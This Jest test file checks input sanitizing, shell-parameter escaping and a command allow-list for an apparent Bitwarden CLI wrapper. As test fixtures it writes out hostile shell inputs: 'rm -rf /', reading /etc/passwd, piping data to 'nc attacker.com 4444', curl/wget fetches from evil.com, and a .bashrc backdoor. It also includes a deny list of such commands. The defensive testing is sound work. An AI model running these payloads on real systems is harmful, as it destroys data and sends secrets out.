import { describe, it, expect } from '@jest/globals';
import {
  sanitizeInput,
  escapeShellParameter,
  buildSafeCommand,
  isValidBitwardenCommand,
} from '../src/utils/security.js';

describe('Security - Command Injection Protection', () => {
  describe('sanitizeInput', () => {
    it('should remove dangerous command separators', () => {
      const input = '; rm -rf /';
      const result = sanitizeInput(input);
      expect(result).toBe('rm -rf /');
      expect(result).not.toContain(';');
    });

    it('should remove logical operators', () => {
      const input = '&& cat /etc/passwd';
      const result = sanitizeInput(input);
      expect(result).toBe('cat /etc/passwd');
      expect(result).not.toContain('&&');
    });

    it('should remove pipe operators', () => {
      const input = '| nc attacker.com 4444';
      const result = sanitizeInput(input);
      expect(result).toBe('nc attacker.com 4444');
      expect(result).not.toContain('|');
    });

    it('should remove command substitution with backticks', () => {
      const input = '`whoami`';
      const result = sanitizeInput(input);
      expect(result).toBe('whoami');
      expect(result).not.toContain('`');
    });

    it('should remove command substitution with $() syntax', () => {
      const input = '$(id)';
      const result = sanitizeInput(input);
      expect(result).toBe('id');
      expect(result).not.toContain('$');
      expect(result).not.toContain('(');
      expect(result).not.toContain(')');
    });

    it('should remove newline injection attempts', () => {
      const input = '\n rm -rf /';
      const result = sanitizeInput(input);
      expect(result).toBe('rm -rf /');
      expect(result).not.toContain('\n');
    });

    it('should remove redirection operators', () => {
      const input = '> /tmp/evil.txt';
      const result = sanitizeInput(input);
      expect(result).toBe('/tmp/evil.txt');
      expect(result).not.toContain('>');
    });

    it('should handle XSS-style injection attempts', () => {
      const input = '<script>alert("xss")</script>';
      const result = sanitizeInput(input);
      expect(result).toBe('scriptalertxss/script');
      expect(result).not.toContain('<');
      expect(result).not.toContain('>');
    });

    it('should handle SQL injection patterns', () => {
      const input = "'; DROP TABLE users; --";
      const result = sanitizeInput(input);
      expect(result).toBe('DROP TABLE users --');
      expect(result).not.toContain("'");
      expect(result).not.toContain(';');
    });

    it('should preserve normal text', () => {
      const input = 'get item myitem';
      const result = sanitizeInput(input);
      expect(result).toBe('get item myitem');
    });

    it('should throw error for non-string input', () => {
      expect(() => sanitizeInput(123 as unknown as string)).toThrow(
        'Input must be a string',
      );
      expect(() => sanitizeInput(null as unknown as string)).toThrow(
        'Input must be a string',
      );
      expect(() => sanitizeInput(undefined as unknown as string)).toThrow(
        'Input must be a string',
      );
    });

    it('should collapse multiple spaces', () => {
      const input = 'get    item     test';
      const result = sanitizeInput(input);
      expect(result).toBe('get item test');
    });

    it('should trim whitespace', () => {
      const input = '  get item test  ';
      const result = sanitizeInput(input);
      expect(result).toBe('get item test');
    });
  });

  describe('escapeShellParameter', () => {
    it('should wrap normal values in single quotes', () => {
      const result = escapeShellParameter('normal-value');
      expect(result).toBe("'normal-value'");
    });

    it('should preserve spaces within single quotes', () => {
      const result = escapeShellParameter('value with spaces');
      expect(result).toBe("'value with spaces'");
    });

    it('should properly escape single quotes', () => {
      const result = escapeShellParameter("value'with'quotes");
      expect(result).toBe("'value'\\''with'\\''quotes'");
    });

    it('should handle double quotes safely', () => {
      const result = escapeShellParameter('value"with"double"quotes');
      expect(result).toBe('\'value"with"double"quotes\'');
    });

    it('should neutralize dangerous characters by wrapping in quotes', () => {
      const result = escapeShellParameter('value;with;semicolons');
      expect(result).toBe("'value;with;semicolons'");
    });

    it('should neutralize command substitution attempts', () => {
      const result = escapeShellParameter('value$(dangerous)');
      expect(result).toBe("'value$(dangerous)'");
    });

    it('should throw error for non-string input', () => {
      expect(() => escapeShellParameter(123 as unknown as string)).toThrow(
        'Parameter must be a string',
      );
      expect(() => escapeShellParameter(null as unknown as string)).toThrow(
        'Parameter must be a string',
      );
      expect(() =>
        escapeShellParameter(undefined as unknown as string),
      ).toThrow('Parameter must be a string');
    });
  });

  describe('buildSafeCommand', () => {
    it('should build simple command with no parameters', () => {
      const result = buildSafeCommand('get');
      expect(result).toBe('get');
    });

    it('should build command with safe parameters', () => {
      const result = buildSafeCommand('get', ['item', 'test-id']);
      expect(result).toBe("get 'item' 'test-id'");
    });

    it('should sanitize base command', () => {
      const result = buildSafeCommand('get; rm -rf /', ['item']);
      expect(result).toBe("get rm -rf / 'item'");
    });

    it('should escape parameters with dangerous characters', () => {
      const result = buildSafeCommand('get', ['item', 'test; rm -rf /']);
      expect(result).toBe("get 'item' 'test; rm -rf /'");
    });

    it('should handle empty parameters array', () => {
      const result = buildSafeCommand('status', []);
      expect(result).toBe('status');
    });

    it('should handle parameters with quotes', () => {
      const result = buildSafeCommand('create', ['item', "test'with'quotes"]);
      expect(result).toBe("create 'item' 'test'\\''with'\\''quotes'");
    });
  });

  describe('isValidBitwardenCommand', () => {
    it('should allow valid Bitwarden commands', () => {
      const validCommands = [
        'get',
        'list',
        'sync',
        'status',
        'lock',
        'unlock',
        'generate',
        'create',
        'edit',
        'delete',
        'confirm',
        'import',
        'export',
        'serve',
        'config',
        'login',
        'logout',
      ];

      validCommands.forEach((cmd) => {
        expect(isValidBitwardenCommand(cmd)).toBe(true);
      });
    });

    it('should allow valid commands with parameters', () => {
      expect(isValidBitwardenCommand('get item test-id')).toBe(true);
      expect(isValidBitwardenCommand('list items')).toBe(true);
      expect(isValidBitwardenCommand('create folder test')).toBe(true);
    });

    it('should block dangerous system commands', () => {
      const dangerousCommands = [
        'rm -rf /',
        'cat /etc/passwd',
        'wget http://evil.com',
        'curl -X POST',
        'nc -l 4444',
        'bash',
        'sh',
        'python',
        'node',
        'chmod +x',
        'sudo',
      ];

      dangerousCommands.forEach((cmd) => {
        expect(isValidBitwardenCommand(cmd)).toBe(false);
      });
    });

    it('should handle commands with leading/trailing whitespace', () => {
      expect(isValidBitwardenCommand('  get  ')).toBe(true);
      expect(isValidBitwardenCommand(' rm -rf / ')).toBe(false);
    });

    it('should be case-sensitive', () => {
      expect(isValidBitwardenCommand('GET')).toBe(false);
      expect(isValidBitwardenCommand('List')).toBe(false);
      expect(isValidBitwardenCommand('SYNC')).toBe(false);
    });
  });

  describe('Integration Tests - Complete Command Injection Protection', () => {
    it('should prevent command injection through buildSafeCommand', () => {
      // Simulate a malicious ID parameter
      const maliciousId = "; rm -rf /; echo 'hacked'";
      const command = buildSafeCommand('get', ['item', maliciousId]);

      // The command should be safely escaped
      expect(command).toBe("get 'item' '; rm -rf /; echo '\\''hacked'\\'''");

      // Verify it's still a valid bitwarden command
      const firstPart = command.split(' ')[0];
      if (firstPart) {
        expect(isValidBitwardenCommand(firstPart)).toBe(true);
      }
    });

    it('should prevent complex injection attempts', () => {
      const maliciousInputs = [
        '$(curl http://evil.com/steal-data)',
        '`wget -O- http://attacker.com/payload`',
        '; cat /etc/passwd | nc attacker.com 4444',
        '&& echo "backdoor" >> ~/.bashrc',
        '|| rm -rf /',
      ];

      maliciousInputs.forEach((maliciousInput) => {
        const command = buildSafeCommand('get', ['item', maliciousInput]);

        // Should be safely wrapped in quotes
        expect(command.includes(`'${maliciousInput}'`)).toBe(true);

        // Base command should still be valid
        expect(isValidBitwardenCommand('get')).toBe(true);
      });
    });

    it('should handle legitimate use cases correctly', () => {
      const legitimateInputs = [
        'my-important-item-123',
        'folder with spaces',
        'item-with-dashes',
        'CamelCaseItem',
        'item_with_underscores',
      ];

      legitimateInputs.forEach((input) => {
        const command = buildSafeCommand('get', ['item', input]);
        expect(command).toBe(`get 'item' '${input}'`);
        expect(isValidBitwardenCommand('get')).toBe(true);
      });
    });
  });
});
